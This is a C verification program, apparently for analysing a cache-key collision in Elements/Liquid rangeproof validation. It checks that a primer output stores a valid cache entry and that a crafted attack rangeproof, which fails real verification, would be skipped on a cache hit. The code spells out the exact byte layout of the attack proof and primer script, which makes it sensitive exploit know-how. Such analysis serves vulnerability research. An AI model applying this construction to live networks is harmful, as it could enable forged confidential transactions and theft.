/* gt_crypto.c -- ground truth for the f24a cache-key collision.
 *
 * 1. derive the L-BTC asset generator exactly as Elements does
 *    (confidential_validation.cpp:379-383) and locate those 33 bytes
 *    inside the attack rangeproof and inside the primer scriptPubKey
 * 2. verify the primer output   71c93d43:0  -> expect TRUE  (this is what stores the cache entry)
 * 3. verify the attack output   f24a:1      -> expect FALSE (this is what the cache hit skips)
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <secp256k1.h>
#include <secp256k1_generator.h>
#include <secp256k1_rangeproof.h>

static unsigned char *slurp(const char *p, size_t *outlen) {
    FILE *f = fopen(p, "r"); if (!f) { fprintf(stderr, "missing %s\n", p); exit(2); }
    fseek(f, 0, SEEK_END); long n = ftell(f); fseek(f, 0, SEEK_SET);
    char *h = malloc(n + 1); if (fread(h, 1, n, f) != (size_t)n) { }
    h[n] = 0; fclose(f);
    size_t hl = strspn(h, "0123456789abcdefABCDEF");
    unsigned char *b = malloc(hl / 2);
    for (size_t i = 0; i < hl / 2; i++) { unsigned v; sscanf(h + 2 * i, "%2x", &v); b[i] = (unsigned char)v; }
    free(h); *outlen = hl / 2; return b;
}
static void hx(const char *lbl, const unsigned char *b, size_t n) {
    printf("%-34s ", lbl); for (size_t i = 0; i < n; i++) printf("%02x", b[i]); printf("\n");
}

int main(void) {
    secp256k1_context *ctx = secp256k1_context_create(SECP256K1_CONTEXT_NONE);
    size_t lp1, lc1, la1, ls1, lp0, lc0, la0, ls0;
    unsigned char *P1 = slurp("data/out1_rangeproof.hex", &lp1);
    unsigned char *C1 = slurp("data/out1_commitment.hex", &lc1);
    unsigned char *A1 = slurp("data/out1_asset.hex",      &la1);
    unsigned char *S1 = slurp("data/out1_script.hex",     &ls1);
    unsigned char *P0 = slurp("data/71c93d43_out0_rangeproof.hex", &lp0);
    unsigned char *C0 = slurp("data/71c93d43_out0_commitment.hex", &lc0);
    unsigned char *A0 = slurp("data/71c93d43_out0_asset.hex",      &la0);
    unsigned char *S0 = slurp("data/71c93d43_out0_script.hex",     &ls0);

    puts("== 1. vchAssetCommitment as Elements builds it (explicit asset -> serialized generator)");
    printf("f24a:1        wire asset   len=%zu prefix=0x%02x\n", la1, A1[0]);
    printf("71c93d43:0    wire asset   len=%zu prefix=0x%02x   same asset id as f24a:1 : %s\n",
           la0, A0[0], (la0 == la1 && !memcmp(A0, A1, la1)) ? "YES" : "NO");
    unsigned char G1[33], G0[33];
    secp256k1_generator g;
    if (!secp256k1_generator_generate(ctx, &g, A1 + 1)) { puts("gen fail"); return 1; }
    secp256k1_generator_serialize(ctx, G1, &g);
    if (!secp256k1_generator_generate(ctx, &g, A0 + 1)) { puts("gen fail"); return 1; }
    secp256k1_generator_serialize(ctx, G0, &g);
    hx("derived generator f24a:1", G1, 33);
    hx("derived generator 71c93d43:0", G0, 33);
    printf("%-34s %s\n", "identical for both outputs:", memcmp(G0, G1, 33) ? "NO" : "YES");
    printf("%-34s %s (offset %d)\n", "G found inside attack proof P1:",
           (lp1 >= 4232 && !memcmp(P1 + 4199, G1, 33)) ? "YES" : "NO", 4199);
    printf("%-34s %s (offset %d)\n", "G found inside primer script S0:",
           (ls0 >= 68 && !memcmp(S0 + 35, G1, 33)) ? "YES" : "NO", 35);

    puts("\n== 2. structural identity of the attack rangeproof");
    printf("|P1|=%zu  |P0|=%zu  |C0|=%zu\n", lp1, lp0, lc0);
    int structural = (lp1 == lp0 + lc0 + 33 + 2) && !memcmp(P1, P0, lp0)
                   && !memcmp(P1 + lp0, C0, lc0) && !memcmp(P1 + lp0 + lc0, G1, 33)
                   && P1[lp1 - 2] == 0x6a && P1[lp1 - 1] == 0x43;
    printf("P1 == P0 || C0 || G || 0x6a || 0x43 : %s\n", structural ? "TRUE" : "FALSE");
    int scriptok = (ls0 == 69) && S0[0] == 0x6a && S0[1] == 0x43
                 && !memcmp(S0 + 2, C1, 33) && !memcmp(S0 + 35, G1, 33) && S0[68] == 0x6a;
    printf("S0 == 0x6a || 0x43 || C1 || G || 0x6a : %s\n", scriptok ? "TRUE" : "FALSE");

    puts("\n== 3. native secp256k1_rangeproof_verify on both contexts");
    uint64_t mn, mx;
    secp256k1_pedersen_commitment com;
    secp256k1_generator gen;

    secp256k1_generator_parse(ctx, &gen, G0);
    if (!secp256k1_pedersen_commitment_parse(ctx, &com, C0)) { puts("C0 parse fail"); return 1; }
    int r_prime = secp256k1_rangeproof_verify(ctx, &mn, &mx, &com, P0, lp0, S0, ls0, &gen);
    printf("primer 71c93d43:0  (C0,P0,script=69B,G) -> %s   min=%llu max=%llu\n",
           r_prime ? "TRUE  <-- stores cache entry" : "FALSE",
           (unsigned long long)mn, (unsigned long long)mx);

    secp256k1_generator_parse(ctx, &gen, G1);
    if (!secp256k1_pedersen_commitment_parse(ctx, &com, C1)) { puts("C1 parse fail"); return 1; }
    int r_atk = secp256k1_rangeproof_verify(ctx, &mn, &mx, &com, P1, lp1, S1, ls1, &gen);
    printf("attack f24a:1      (C1,P1,script=1B ,G) -> %s  <-- never reached on a cache hit\n",
           r_atk ? "TRUE" : "FALSE");

    puts("");
    printf("VERDICT: structural=%d script=%d primer_true=%d attack_false=%d\n",
           structural, scriptok, r_prime, !r_atk);
    return (structural && scriptok && r_prime && !r_atk) ? 0 : 1;
}
